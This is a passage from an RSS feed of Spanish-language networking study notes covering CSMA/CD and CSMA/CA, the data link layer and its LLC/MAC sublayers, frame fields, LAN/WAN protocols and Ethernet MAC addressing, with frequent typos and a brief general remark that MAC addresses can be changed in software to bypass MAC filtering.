<br>La PC1 tiene una trama que se debe enviar a la PC3. La NIC de la PC1 necesita determinar si algún dispositivo está transmitiendo en el medio. Si no detecta un porveedor de señal, en otras palabras, si no recibe transmisiones de otro dispositivo, asumirá que la red está disponible para enviar.<br>La NIC del PC1 esnvía la trama Ethernet cuando el medio está disponible, como se muestra en la figura.<br><img alt="CSMA_CD_example_image_1.png" src="https://dobliuw.com/lib/media/csma_cd_example_image_1.png"><br>El hub Ethernet recibe y envía la trama. Un hub de Ethernet también se conoce como repetidor multipuerto. Todos los bits que se reciben de un puerto entrante se regeneran y evían a todos los demás puertos, como se indica en la imagen de abajo.<br>Si otro dispositivo, como una PC2, quiere transmitir, pero está recibiendo una trama, deberá esperar hasta qeu el canal esté libre.<br><img alt="CSMA_CD_example_image_2.png" src="https://dobliuw.com/lib/media/csma_cd_example_image_2.png"><br>Todos los dispositivos que están conectados al hub reciben la trama. Dado que la trama tiene un dirección destino de enlace de datos para la PC3, solo ese dispositivo aceptará yh copiará toda la trama. Todas las demás NIC del dispositivo ignorarán la trama, como se muestra en la siguiente imagen:<br><img alt="CSMA_CD_example_image_3.png" src="https://dobliuw.com/lib/media/csma_cd_example_image_3.png"><br><br><br>Otra forma de CSMA utilizada por las WLAN IEEE 802.11 es el acceso múltiple / detección de colisión de portadora (CSMA/CA).<br>CSMA/CA utiliza un método similar a CSMA/CD para detectar si el medio está libre. CSMA/CA usa técnicas adicionales. En entornos inalámbricos, es posible que un dispositivo no detecte una colisión. CSMA/CA no detecta colisiones pero intenta evitarlas ya que aguarda ntes de transmitir. Cada dispositivo que transmite incluye la duración que necesita para la transmisión. Todos los demás dispositivos inalámbricos reciben esta información y saben durante cuánto tiempo el medio no estará disponible.<br>En la imagen, si el host A recibe una trama inalámbrica desde el punto de acceso, los hosts B y C también verán la trama y cuánto tiempo el medio no estará disponible.<br><img alt="CSMA_CA_example_image.png" src="https://dobliuw.com/lib/media/csma_ca_example_image.png"><br>Luego  de que un dispositivo inalámbrico envía una trama 802.11, el receptor devuelve un acuso de recibo para que el emisor sepa que se recibió la trama. <br>Ya sea que es una red LAN Ethernet con concentradores o una red WLAN, los sistemas por conteción no esclan bien bajo un uso intensivo de los medios.]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/2.-data-link/topologies/2.-access-control-methods.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/0. Layer 1 and 2/2. Data Link/Topologies/2. Access control methods.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 07 Oct 2024 23:56:30 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/containment_based_access_example_image.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/containment_based_access_example_image.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Data Link Layer]]></title><description><![CDATA[ 
 <br><br>La capa de enlace de datos del <a data-href="OSI Model" href="https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/3.0-models/osi-model/osi-model.html" class="internal-link" target="_self" rel="noopener nofollow">OSI Model</a>, como se muestra en la siguiente imagen, prepara los datos de red para la red física. La capa de enlace de datos es respondable de las comunicaciones de tarjeta de interfaz de red (NIC) a tarjeta de interfaz de red. L a capa de enlace de datos realiza lo siguiente:<br>
<br>Permite que las capas superiores accedan a los medios. El protocolo de capa superior no conoce completamente el tipo de medio que se uiltiza para reenviar los datos.
<br>Acepta datos, generalmente paqeutes de Capa 3 (Es decir, IPv4 o IPv6) y los encapsula en tramas de Capa 2.
<br>Controla cómo los datos se colocan y reciben en los medios.
<br>Intercambia tramas entre puntos finales a través de los medios de red.
<br>Recibe datos encapsulados, generalmente paquetes de Capa 3, y los dirige al protocolo de capa superior adecuado.
<br>Realiza la detección de errores y rechaza cualquier trama dañada.
<br><img alt="data_link_simple_image.png" src="https://dobliuw.com/lib/media/data_link_simple_image.png"><br>En redes de equipo, un nodo es un dispositivo que puede recibir, crear, almacenar o reenviar datos a lo largo de una ruta de comunicaciones. Un nodo puede ser un endpoint como una Notebook, PC o Celular, o un dispositivo intermedio como un Ethernet Switch.<br>Sin la capa de enlace de datos, un protocolo de capa de red, tal como IP, tendría que tomar medidas para conectarse con todos los tipos de medios que pudieran existir a lo largo de la ruta de envío. Además, cada vez qeu se desarrola una nueva tecnología de red o medio IP, tendría que adaptarse.<br>En la siguiente imagén veremos un ejemplo de cómo la capa de enlace de datos agrega información de destino Ethernet de Capa 2 y NIC de origen a un paquete de Capa 3. A continuación, convertirá esta información a un formato compativle con la capa 1 (<a data-href="0. Physical Layer" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/1.-physical/0.-physical-layer.html" class="internal-link" target="_self" rel="noopener nofollow">0. Physical Layer</a>). <br><img alt="data_link_layer_append_etherinfo_example_image.png" src="https://dobliuw.com/lib/media/data_link_layer_append_etherinfo_example_image.png"><br><br>Los estándares IEEE 802 LAN/MAN son específicos para LAN Ethernet, LAN inalámrbicas (WLAN), redes de área personal inalámbricas (WPAN) y otros tipos de redes locales y metropolitanas. La capa de enlace de adatos IEEE 802 LAN/MAN contra de dos subcapas siguientes:<br>
<br>
Control de enlace lógico (LLC): Esta subcapa IEEE 802.2 se comunica entre el software de red en las capas superiores y el hardware del dispositivo en las capas inferiores. Coloca en la trama información que identifica qué protocolo de cada de red se utiliza para la trama. Esta información permite que múlitiples protocolos de Capa 3, como IPv4 y IPv6, utilicen la misma interfaz de red y medios.

<br>
Control de Acceso a Medios (MAC): Implementa esta subcapa (IEEE 802.3, 802.11 o 802.15) en hardware. Es responsable de la encapsulación de datos y el control de acceso a los medios. Proporciona direccionamiento de capa de enlace de datos y está integrado con varias teconologías de capa física.

<br>A continuación se muestra ambas subcapas:<br><img alt="data_link_sub_layers_llc_mac_example_image.png" src="https://dobliuw.com/lib/media/data_link_sub_layers_llc_mac_example_image.png"><br>La subcapa LLC toma los datos del protocolo de red, que generalmente es un paquete IPv4 o IPv6, y agrega información de control de Capa 2 para ayudar a entregar el paqeute al nodo de destino.<br>La subcapa MAC, por otro lado, controla la NIC (Network Inerface Card) y otro hardware que es respondable de enviar y recibidr datos en el medio LAN/MAN con cable o inalámbrico.<br>La subcapa MAC proporciona encapsulamiento de datos:<br>
<br>Delimitación de tramas: El proceso de entramado porporciona delimitadores importantes que se uilitzan para identificar un grupo de bits que componen una trama. Estos bits delimitadores porporcionan sincronización dentre los nodos de transmisión y de recepción.
<br>Direccionamiento: Proporciona direccionamiento de origen y destino para trasnportar la trama de capa 2 entre dispositivos en el mismo medio compartido.
<br>Detección de errores: Cada trama contiene un tráiler utilizado para detectar errores de transmisión.
<br>La subcapa MAC también proporciona control de acceso a medios, lo que permite que varios dispositivos se comuniquen a través de un medio compartido (Semidúplex). Las comunicaciones dúplex completo no requieren control de acceso.<br><br>Los protocolos de capa de enlace de datos generalmente no están definidos por la Solicitud de comentarios (RFC), a diferencia de los protooclos de las capas superiores del conjunto TCP/IP. El grupo de trabajo de ingeniería de Internet (IETF) mantiene los protocolos y servicios funcionales para el conjunto de protocolos TCP/IP en las capas superiores, pero no definen las funciones y el funcionamiento de la capa de acceso a la red TPC/IP.<br>Las organizaciiones de ingeniería que definen estándares abiertos y protocolos que se aplican a la capa de acceso a la red (Es decir, las capas físicas y de enlace de datos OSI) incluyen lo siguiente:<br>
<br>Instituto de Ingenieros Eléctricos y Electrónicos (IEEE)
<br>Unión Internacional de Telecomunicaciones (ITU)
<br>Organización Internacional para la Estandarización (ISO)
<br>Instituto Nacional Estadounidense de Estándares (ANSI)
<br><br><br>Cada entorno de red que los paquetes encuentran cuando viajan desde un host local hasta un host remoto puede tener características diferentes. Por ejemplo, una LAN Ethernet generalmente consta de muchos hosts que compiten por el acceso en el medio de red. La subcapa MAC resuelve esto. Con los enlaces serie, el método de acceso sólo puede consistir en una conexión directa entre solo dos dispositivos, generalmente dos routers.<br>Las interfaces del router encapsulan el paquete en la trama apropiada. Se utiliza un método adecuado de control de acceso a los medios para acceder a cada enlace. En cualqueir intercambio de paquetes de capas de red, puede haber muchas transiciones de medios y capa de enlace de datos.<br>En cada saltoentre nodos a lo largo de la ruta, un router raeliza las sigueintes funciones de Capa 2:<br>
<br>Aceptan una trama proveniente de un medio.
<br>Desencapsulan la trama.
<br>Vuelven a encapsular el paquete en una trama nueva.
<br>Reenvían la nueva trama adecuada al medio de ese segmento de la red física.
]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/2.-data-link/0.-data-link-layer.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/0. Layer 1 and 2/2. Data Link/0. Data Link Layer.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 09 Oct 2024 20:54:42 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/data_link_simple_image.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/data_link_simple_image.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[The Frame]]></title><description><![CDATA[ 
 <br><br>En este artículo describiremos en detalle lo que sucede con la trama de enlace de datos a medida que se mueve a través de una red. La información anexada a una trama está determinada por el protocolo que se está utilizando.<br>La capa de enlace de datos prepara los datos encapsulados (Generalmente un paquete IPv4 o IPv6) para el transporte a través de los medios locales encapsulándolos con un encabezado y un trailer para crear un trama.<br>El protocolo de enlace de datos es responsable de las comunicaciones de NIC a NIC dentro de la misma red. Si bien existen muchos protocolos de capa de enlace de datos diferentes que describen las tramas de la capa de enlace datos, cada tipo de trama tiene tres partes básicas:<br>
<br>Header / Encabezado.
<br>Data / Datos.
<br>Trailer / Tráiler.
<br>A diferencia de otros protocolos de encapsulación, la capa de enlace de datos agrega información en forma de trailer al final de la trama. <br>Todos los protocolos de capa de enlace de datos encapsulan los datos dentro del campo de datos de la trama. Sin embargo, la estructura de la trama y los campos contenidos en el encabezado y tráiler varían de acuerdo con el protocolo.<br>No hay una estructura de trama que cumpla con las necesidades de todos los transportes de datos a través de todos los tipos de medios. Según el entorno, la cantidad de información de control que se necesita en la trama varía para cumplir con los requisitos de control de acceso al medio de la topología lógica y de los medios. Por ejemplo, una trama WLAN debe incluir procedimientos para evitar colisiones y, por lo tanto, requiere información de control adicional en comparación con una trama Ethernet.<br>Como se muestra en la siguiente imagen, en un entorno frágil, se necesita más controles para garantizar la entrega. Los campos del encabezado y del tráiler son más grandes porque se necesita más información de control.<br><img alt="transmitting_a_frame_example_image.png" src="https://dobliuw.com/lib/media/transmitting_a_frame_example_image.png"><br>Se necesitan mayores esfuerzos para garantizar la entrega. Esto significa una sobrecarga más alta y velocidades de transmisión más lentas.<br><br><br>El tramado rompe la transmisión en agrupaciones descifrables, con la información de control insertada en el encabezado y tráiler como valores en campos diferentes. Este formato proporciona a las señales físicas una estructura reconocida por los nodos y decodificada en paquetes en el destino.<br>Los campos de trama genéricos se muestran en la siguiente imagen. No todos los porotoclos incluyen todos estos campos. Los estándares para un protocolo específico de enlace de datos definen el formato real de la trama.<br><img alt="frame_fields_example_image.png" src="https://dobliuw.com/lib/media/frame_fields_example_image.png"><br>Los campos de trama incluyen los siguientes:<br>
<br>Indicadores de Arraque y Detención de trama: Se utilizan para identificar los límites de comienzo y finalización de la trama.
<br>Direccionamiento: Indica los nodos de origen y destino en los medios.
<br>Tipo: Identifica el protocolo de capa 3 en el campo de datos.
<br>Control: Identifica los servicios especiales de control de flujo, como calidad de servicio (QoS). QoS otorga prioridad de reenvío a ciertos tipos de mensajes. Por ejemplo, las tramas de voz sobre IP (VoIP) normalmente reciben prioridad porque son sensibles al retraso.
<br>Datos: Incluye el contenido de la trama (Es decir, el ecanbezado del paquete, el encabezado del segmento y los datos en si). 
<br>Detección de errores: Se inlcuye después de los datos para formar el trailer.
<br>Los protocolos de capa de enlace de datos agregan un tráiler al final de cada trama. En un proceso llamada detección de errores, el avance determina si la trama llegó sin error. Coloca un resumen lógico o matemático de los bits que componente la trama en el avance. La capa de enlace de datos agrega detección de errrores porque las señales en los medios podrían estar sujetas a interferencia, distorsión o pérdida que cambiaría sustancialmente los valore de ebits que representan esas señales.<br>Un nodo de tranmisión crea un resumen lógico del contenido de la trama, conocido como el valor de comprobación de redundancia cíclica (CRC). Este valor se coloca en el campo Secuencia de Verificación de la Trama (FCS) para representar el contenido de la trama. En el tráiler Ethernet, el FCS proporciona un método para que el nodo receptor determine si la trama experimentó errores de trasmisión.<br><br><br>La capa de enlace de datos proporciona el direccionamiento utilizado en el transporte de una trama a través de un medio local compartido. Las direcciones de dispoisitivo en esta capa se llaman direcciones físicas. El direccionamiento de la capa de enlace de datos está contenido en el encabezado de la trama y específica el nodo de destino de la trama en la red local. Normalmente se encuentra al principio de la trama, por lo que la NIC puede determina rápidamente si coincide con su propia dirección de Capa 2 antes de aceptar el resto de la trama. El encabezado de la trama también puede contener la dirección de origen de la trama.<br>A diferencia de las direcciones lógicas de la Capa 3, que son jerárquicas, las direcciones físicas no indican en qué red está ubicado el dispoisitivo. En cambio, la dirección física es única para un dispositivo en particular. Un dispositivo seguirá funcionando con la misma dirección física de capa 2, incluso si el dispositivo se mueve a otra red o subred. Por lo tanto, las direcciones de Capa 2 sólo se utilizan para conectar dispositivos dentro del mismo medio compartido, en la misma red IP.<br>Las imagenes a continuación mostrarán la función de las direcciones de capa 2 y capa 3. A medida que el paquete IP se mueve de host a router, de router a router y, finalmente, de router a host, es encapsulado en una nueva trama de enlac e de atos, en cada punto del recorrido. Cada trama de enlace de datos contien la dirección de origen de enlace de datos de la tarjeta NIC que envía la trama y la dirección de destino de enlace de datos de la tarjeta NIC que recibe la trama.<br><br>El host de origen encapsula el paquete IP de Capa 3 en una trama de Capa 2. En el encabezado de trama, el host agrega su direcciónd e Capa 2 como origen y la dirección de Capa 2 para R1 como destino.<br><img alt="layer_2_directions_host_to_host_example_image.png" src="https://dobliuw.com/lib/media/layer_2_directions_host_to_host_example_image.png"><br><br>R1 encapsula el paquete IP de Capa 3 en una nueva trama de Capa 2. En el encabezado de trama, R1 agrega su dirección de Capa 2 como origen y la dirección de Capa 2 para R2 como destino.<br><img alt="layer_2_directions_router_to_router_example_image.png" src="https://dobliuw.com/lib/media/layer_2_directions_router_to_router_example_image.png"><br><br>R2 encapsula el paquete IP de Capa 3 en una nueva trama de Capa 2. En el encabezado de trama, R2 agrega su dirección de Capa 2 como origen y la dirección de Capa 2 para el servidor como el destino.<br><img alt="layer_2_directions_router_to_host_example_image.png" src="https://dobliuw.com/lib/media/layer_2_directions_router_to_host_example_image.png"><br>La dirección de la capa de enlace de datos solo se usa para la entrega local. Las direcciones en esta capa no tienen singnificado más allá de la red local. Comparemos esto con la Capa 3, en donde las direcciones en el encabezado del paquete pasan del host de origen al host de destino, sin tener en cuenta la cantidad de saltos de redes a lo largo de la ruta.<br>Si los datos deben pasar a otro segmento de red, se necesita un dispositivo intermediario, com un router. El router debe aceptar la trama según la dirección física establecida en la trama y desencapsularla para examinar la dirección jerárquica, o dirección IP. Usando la dirección IP, el router puede determinar la ubicación de red del dispositivo de destino y la mejor ruta para llegar a él. Una vez que sabe adónde reenviar el paquete, el router crea una nueva trama para el paquete, y la nueva trama se envía la segmento de red siguiente hacia el destino final.]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/2.-data-link/1.-data-link-frame.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/0. Layer 1 and 2/2. Data Link/1. Data Link Frame.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 22 Oct 2024 22:32:14 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/transmitting_a_frame_example_image.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/transmitting_a_frame_example_image.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[LAN &amp; WAN Frames]]></title><description><![CDATA[ 
 <br><br>Los protocolos Ethernet son utilziados por LAN cableadas. Las comunicaciones inalámbricas caen bajo los protoclos WLAN (IEEE 802.11). Estos protocolos fueron diseñados para redes multiacceso.<br>Tradicionalmente, los WAN utilizaban otros tipos de protocolos para varios tipos de topologías punto a punto, hub-spoke y de malla completa. Algunos de los protocolos WAN comunes a lo largo de los años han incluido:<br>
<br>Protocolo punto a punto (PPP).
<br>Control de enlace de datos de alto nivel (HDLC, High-Level Data Link Control).
<br>Frame Relay.
<br>Modo de transferencia asíncrona (ATM).
<br>X.25.
<br>Estos protocolos de capa 2 ahora están siendo reemplazados en la WAN por Ethernet.<br>En una red TCP/IP, todos los protocolos de capa 2 del <a data-href="OSI Model" href="https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/3.0-models/osi-model/osi-model.html" class="internal-link" target="_self" rel="noopener nofollow">OSI Model</a> funcioan con la dirección IP en la capa 3. Sin embargo, el protocolo de capa 2 específico que se utilice depende de la topología lógiva y de los medios físicos.<br>Cada protocolo realiza el control de acceso a los medios para las topologías lógicas de capa 2 que se específican. Esto significa que una cantidad de diferentes dispoisitivos de red puede actuar como nodos que operan en la capa de enlace de datos al implementar estos protocolos. Esstos dispositovs incluyen las tarjetas de interfaz de red en PC, así como las interfaces en routers y en swtiches de la capa 2.<br>Una LAN generalmente usa una tecnología de alto ancho de banda capaz de soportar grandes cantidades de hosts. El área geográfica relativamente pequeña de una LAN (Un solo ed ificio o un campus de varios edificios) y su alta densidad de usuarios hacen que esta tecnología sea rentable.<br>Sin embargo, utilizar una tecnología de ancho de banda alto no es generalmente rentable para redes de área extensa que cubren grandes áreas geográficas (Varias ciudades, por ejemplo). El costo de los enlaces físicos de larga distancia y la tecnología utilizada para transportar las señakles a través de esas distancias, generlamente, ocasiona una menor capacidad de ancho de banda.<br>Los protocolos de la capa de enlace de datos incluyen:<br>
<br>Ethernet.
<br>802.11 Inalámbrico.
<br>Protocolo punto a punto (PPP).
<br>Control de enlace de datos de alto nivel (HDLC, High-Level Data Link Control).
<br>Frame Relay.
]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/2.-data-link/2.-lan-and-wan-frames.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/0. Layer 1 and 2/2. Data Link/2. LAN and WAN Frames.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 09 Oct 2024 20:48:19 GMT</pubDate></item><item><title><![CDATA[Ethernet Encapsulation]]></title><description><![CDATA[ 
 <br><br>Ethernet es una de las dos tecnologías LAN utilizadas hoy en día, siendo la otra LAN Inalámbrica (WLAN). Ethernet utiliza comunicaciones por cable, incluyendo pares trenzados, enlaces de fibra óptica y cables coaxiales.<br>Ether funciona en la capa de enlace de datos (<a data-href="0. Data Link Layer" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/2.-data-link/0.-data-link-layer.html" class="internal-link" target="_self" rel="noopener nofollow">0. Data Link Layer</a>) y en la capa física (<a data-href="0. Physical Layer" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/1.-physical/0.-physical-layer.html" class="internal-link" target="_self" rel="noopener nofollow">0. Physical Layer</a>). Es una familia de tecnologías de red definidas en lso estándares IEEE 802.2 y 802.3. Ethernet soporta los siguientes anchos de banda de datos:<br>
<br>10 Mbps.
<br>100 Mbps.
<br>1000 Mbps (1 Gbps).
<br>10.000 Mbps (10 Gbps).
<br>40.000 Mbps (40 Gbps).
<br>100.000 Mbps (100 Gbps).
<br>Como se muestra en la siguiente imagen, los estándares de Ethernet definen tanto los protocolos de Capa 2 como las tecnologías de Capa 1:<br><img alt="ethernet_standars_layer1_and_2_example_image.png" src="https://dobliuw.com/lib/media/ethernet_standars_layer1_and_2_example_image.png"><br>Ethernet se define mediante protocolos de capa física y de capa de enlace de datos.<br><br><br>Como vimos en la sección de <a data-href="0. Data Link Layer#Sublayers" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/2.-data-link/0.-data-link-layer.html#Sublayers" class="internal-link" target="_self" rel="noopener nofollow">0. Data Link Layer &gt; Sublayers</a>, los protocolos IEEE 802.2 LAN/MAN, incluyendo Ethernet, utilizan las dos subcapas independientes siguientes de la capa de enlace de datos para operar. Son el Logical Link Control (LLC) y el Medium Access Control (MAC), como se muestra en la imagen.<br>Como vimos, los roles de estas dos subcapas son:<br>
<br>
Logical Link Control (LLC): Esta subcapa IEEE 802.2 se comunica entre el software de red en las capas superiores y el hardware del dispostivio en las capas inferiores. Coloca en la trama información que identifica qué protocolo de capa de red se utiliza para la trama. Esta información permite que múltiples protocolos de Capa 3, como IPv4 e IPv6, utilicen la misma interfaz de red y medios.

<br>
Medium Access Control (MAC): Esta subcapa (IEEE 802.3, 802.11 o 802.15) se implementa en hardware y es responsable de la encapsulación de datos y control de acceso a medios. Proporciona direccionamiento de capa de enlace de datos y está integrado con varias tecnologías de capa física. 

<br><img alt="data_link_sub_layers_llc_mac_example_image.png" src="https://dobliuw.com/lib/media/data_link_sub_layers_llc_mac_example_image.png">]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/0.-switching-ethernet.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/0. Layer 1 and 2/0. Switching Ethernet.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 14 Oct 2024 18:58:38 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/ethernet_standars_layer1_and_2_example_image.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/ethernet_standars_layer1_and_2_example_image.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Sublayer MAC]]></title><description><![CDATA[ 
 <br><br>La subcapa MAC es responsable de la encapsulación de datos y el acceso a los medios (<a data-href="0. Network Components#Network media" href="https://dobliuw.com/notes/2.-networks/network-basics/1.-structure/0.-network-components.html#Network_media" class="internal-link" target="_self" rel="noopener nofollow">0. Network Components &gt; Network media</a>).<br><br>La encapsulación de datos IEEE 802.3 incluye lo siguiente:<br>
<br>Trama de Ethernet: Esta es la estrcutura interna de la trama Ethernet.
<br>Direccionamiento Ethernet: La trama Ethernet incluye una dirección MAC de origen y destino para e ntregar la trama Ethernet de NIC Ethernet a NIC Ethernet en la misma LAN.
<br>Detección de errores Ethernet: La trama Ethernet incluye un avance de secuencia de verificación de trama (FCS) utilizado para la detección de errores.
<br><br>Como se muestra en la imagen, la subcapa MAC IEEE 802.3 incluye las específicaciones para diferentes estándares de comunicación Ethernet sobre varios tipos de medios, incluyendo cobre (<a data-href="0. Copper Wiring" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/1.-physical/wiring/copper/0.-copper-wiring.html" class="internal-link" target="_self" rel="noopener nofollow">0. Copper Wiring</a>) y fíbra (<a data-href="0. Fiber Optic Wiring" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/1.-physical/wiring/fiber-optic/0.-fiber-optic-wiring.html" class="internal-link" target="_self" rel="noopener nofollow">0. Fiber Optic Wiring</a>).<br><img alt="sublayer_mac_estandars_example_image.png" src="https://dobliuw.com/lib/media/sublayer_mac_estandars_example_image.png"><br>Recordemos que Ethernet heredado utiliza una topología de bus o hubs, es un medio compartido, medio dúplex. Ethernet a través de un medio dúplex utiliza un método de acceso basado en contención, detección de acceso múltiples/detección de colisiones (CSMA/CD). Esto garantiza que sólo un dispositivo esté transmitiendo a la vez. CSMA/CD permite que varios dispositivos compartan el mismo medio dúplex, detectando una colisión cuando más de un dispositivo intente transmitir simultáneamente. También proporciona un algortimo de retroceso para la retransmisión.<br>Las LAN Ethernet de hoy utilizan swtiches que funcionan en dúplex completo. Las comunicaciones dúplex completo con swtiches Ethernet no requiere control de acceso a través de CSMA/CD.<br><br><br>El tamaño mínimo de una trama Ethernet es de 64 bytes, y el máximo es de 1518 bytes. Esto incluye todos los bytes del campo de dirección MAC de destino a través del campo de secuencia de verificación de trama (FCS). El campo preámbulo no se incluye al describir el tamaño de una trama.<br>Cualquier trama de menos de 64 bytes de longitud se considera un framento de colisión o una trama corta, y es descartada automáticamente por las estaciones receptoras. Las tramas de más de 1500 bytes de datos se consideran jumbos.<br>Si el tamaño de una trama transmitira es menor que el mínimo o mayor que el máximo, el dispositivo receptor descarta la trama. Es posible que las tramas descartadas se origienen en colisione u otras señales no desadas. Ellas se consideran inválidas. Las tramas jumbo suelen ser compatibles con la mayoría de los Switches y NIC Fas Ethernet y Gigabit Ethernet.<br>La imagen a continuación muestra cada campo en una trama Ethernet:<br><img alt="layers_ethernet_frame_sizes_example_image.png" src="https://dobliuw.com/lib/media/layers_ethernet_frame_sizes_example_image.png"><br>Cada uno de estos campos tiene una función específica que se describirá a continuación:<br><br><br><br>En una LAN Ethernet, cada dispositivo de res está conectado a los mismos medios compartidos. La dirección MAC se utiliza para identificar los dispositivos físicos de origen y destino (NIC) en el segmento de red local. El direccionamiento MAC proporciona una método para la identificación del dispositivo en la capa de enlace de datos del <a data-href="OSI Model" href="https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/3.0-models/osi-model/osi-model.html" class="internal-link" target="_self" rel="noopener nofollow">OSI Model</a>.<br>Una direccióm MAC Ethernet es una dirección de 48 bits expresada con 12 dígitos hexadecimales, como se muestra en las iguiente imagen. Debido a que un byte equivale a 8 bits, también podemos decir qeu una dirección MAC tiene 6 bytes de longitud:<br><img alt="mac_address_bytes_bits_example_image.png" src="https://dobliuw.com/lib/media/mac_address_bytes_bits_example_image.png"><br>Todas las direcciones MAC deben se rúnicas para el dispositivo Ethnert o la interfaz Ethernet. Para garantizar esto, todos los proveedores que venden dispositivoes Ethernet deben registrarse con el IEEE para obtener un código hexadecimal único de 6 (es decir, 24 bits o 3 bytes) denominado identificador único de organización (OUI / Organization Unic Identifer)<br>Cuando un proveedor asigna una dirección MAC a un dispositivo o interfaz Ethernet, el proveedor debe hacer lo siguiente:<br>
<br>Utilizar el OUI asignado como los primeros 6 dígitos hexadecimales (3 bytes).
<br>Asignar un valor único en los últimos 6 dígitos hexadecimales (Ultimos 3 bytes).
<br>Por lo tanto, una dirección MAC Ethernet consiste en un código OUI de proveedor hexadecimal (El cual puede ayudarnos a descifrar como atacantes ante que tipo de proveedor nos estamos enfrentando), seguido de un valor asignado por el proveedor hexadeciaml 6, como se muestra en la imagen: <br><img alt="mac_address_oui_and_nic_example_image.png" src="https://dobliuw.com/lib/media/mac_address_oui_and_nic_example_image.png"><br>Por ejemplo, si Cisco necesita asignar una dirección MAC única a un nuevo dispositivo, el IEEE ha asignado a Cisco con el OUI de 00-60-2F. Cisco configuraría entonces el dispositivo con un código de proveedor único como 3A-07-BC. Por lo tatno, la dirección MAC Ethernet de este dispositivo sería 00-60-2F-3A-07-BC. <br>Es responsabilidad del proveedor asegurarse de que ninguno de sus dispositivose tenga asginada la misma dirección MAC. Sin embargo, es posible que existan direcciones MAC duplicadas debido a errores cometidos durante la fabricación, errores cometidos en algunos métodos de implementación de máquinas virtuales o modificaciones realizazdas con una de varias herramientas de software. En cualquier caso, será necesario modificar la dirección MAC con una nueva NIC o realizar modificaciones a través del software. <br><br><br>A veces, la dirección MAC se conoce como una dirección grabada (BIA) porque la dirección está codificada en la memoria de solo lectura (ROM) en la NIC. Es decir que la dirección está codificada en el chip de la ROM de manera permanente.<br>En los sistemas operativos de PC y NIC modernos, es posible cambiar la dirección MAC en el software. Esto es útil cuando se intente acceder a una red filtrada por BIA. En consecuencia, el filtrado o el control de tráfico basado en la dirección MAC ya no son tan seguros.<br>Cuando una computadora se reinicia, la NIC copia su dirección MAC de la ROM a la RAM. Cuando un dispositivo reenvía un mensaje a una red Ethernet, el encabezado Ethernet incluye:<br>
<br>Dirección MAC de origen
<br>Dirección MAC de origen
<br>Cuando una NIC recibe una trama de Ethernet, examina la dirección MAC de destino para ver si coincide con la dirección MAC física que está almacenada en la RAM. Si no hay coincidencia, el dispostiivo descarta la trama. Si hay coincidencia, evía la trama a las capas OSI, donde ocurre el proceso de desencapsulamiento.<br>Cualquier dispositivo que sea el origen o destino de una trama Ethernet, tendrá una NIC Ethernet y, por lo tanto, una dirección MAC. Esto incluye workstations, servidores, impresoras, dispositivos móviles y routers.]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/1.-sublayer-mac.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/0. Layer 1 and 2/1. Sublayer MAC.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 14 Oct 2024 18:58:34 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/sublayer_mac_estandars_example_image.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/sublayer_mac_estandars_example_image.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Unicast MAC Address]]></title><description><![CDATA[ 
